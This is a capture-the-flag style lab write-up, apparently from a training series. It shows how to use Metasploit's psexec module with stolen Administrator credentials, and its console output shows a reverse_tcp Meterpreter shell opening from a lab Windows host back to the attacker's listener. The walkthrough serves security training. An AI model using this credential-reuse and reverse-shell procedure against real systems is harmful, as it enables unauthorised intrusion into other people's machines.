# **Challenge 6: Metasploit**
!!! note ""
## **Procedure:**

Now that we have a username and password, we need to use them to gain access to one of the Windows targets. Connecting using "legitimate" means like Remote Desktop Protocol (RDP) could be possible, but a Meterpreter shell can give us more user-friendly options to achieve our goals. 

- Start up the Metasploit framework on Kali, and load the windows/smb/psexec exploit module. 
Note: This module is a common exploit for gaining access to Windows machines with stolen credentials. 
- Configure the module's options to set the username and password you found previously. You will not need to specify a domain. 
Set the `RHOSTS` target to one of the Windows IPs you found with Nmap earlier. 
Note: These credentials will only work on one of the two Windows machines. If the exploit fails, set the other IP address as the target and try again.
- Set the payload to `windows/x64/meterpreter/reverse_tcp` and confirm its options automatically configure properly.
- Run the exploit. If everything works, you will be dropped into a Meterpreter shell on the target system. If not, test it against the other Windows target. If neither exploit works, double-check your options (check for typos in IP addresses, usernames, passwords, etc.) 


## **Solution:**

### Start up the Metasploit framework on Kali, and load the `windows/smb/psexec` exploit module.

![alt text](images/Pasted%20image%2020240508001358.png)

### Showing the options in the `windows/smb/psexec` exploit module.

![alt text](images/Pasted%20image%2020240508001604.png)



### Set the RHOSTS and running the `psexec` module (Windows VM 172.31.43.103)

```bash linenums="1" hl_lines="2 15"
msf6 exploit(windows/smb/psexec) > set RHOST 172.31.43.103
RHOST => 172.31.43.103
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 172.31.39.126:4444 
[*] 172.31.43.103:445 - Connecting to the server...
[*] 172.31.43.103:445 - Authenticating to 172.31.43.103:445 as user 'Administrator'...
[*] 172.31.43.103:445 - Selecting PowerShell target
[*] 172.31.43.103:445 - Executing the payload...
[+] 172.31.43.103:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 172.31.43.103
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
[*] Meterpreter session 1 opened (172.31.39.126:4444 -> 172.31.43.103:49962) at 2024-05-08 04:20:56 +0000

meterpreter > sysinfo
Computer        : EC2AMAZ-L3OOUG8
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > 
```

## The meterpreter shell was sucesfully deployed

<div id="disqus_thread"></div>
<script>
    /**
    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
    /*
    var disqus_config = function () {
    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */
    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://hcoco1-1.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
!!! note ""

<div class="button-container" markdown="1">
<a href="/Career-Simulation-3/challenge_5/" class="md-button md-button--primary">Previous: Challenge 5</a>
<a href="/Career-Simulation-3/" class="md-button md-button--secondary">Home 🏠</a>
<a href="/Career-Simulation-3/challenge_7/" class="md-button md-button--primary">Next: Challenge 7</a>
</div>

